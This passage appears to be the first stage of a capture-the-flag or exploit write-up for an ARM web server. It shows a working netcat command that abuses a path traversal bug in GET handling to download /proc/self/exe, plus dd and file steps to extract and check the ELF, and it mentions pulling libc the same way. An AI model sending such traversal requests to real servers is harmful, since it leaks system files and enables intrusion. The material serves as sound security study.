# Stage 1

There's a path traversal bug in the code that handles GET requests.
Abusing this, the binary can be obtained:

```bash
printf "GET ../../../../../proc/self/exe HTTP/1.1\r\n\r\n" | nc $ip 80 > response
```

Afterwards the HTTP header needs to be stripped:

```bash
dd if=response of=websrv bs=1 skip=$(python -c "print(open('response', 'rb').read().index(b'\x7fELF'))")
```

file should now report an elf file:

```bash
$ file websrv 
websrv: ELF 32-bit LSB shared object, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-armhf.so.3, for GNU/Linux 2.6.26, BuildID[sha1]=8f6a73fa2b913d8a5d7c9ce5797188b90457d0e5, stripped
```

The same can be done to retrieve the libc in use on the target system (get it's path through /proc/self/maps).

At this point it's time for some reverse engineering.
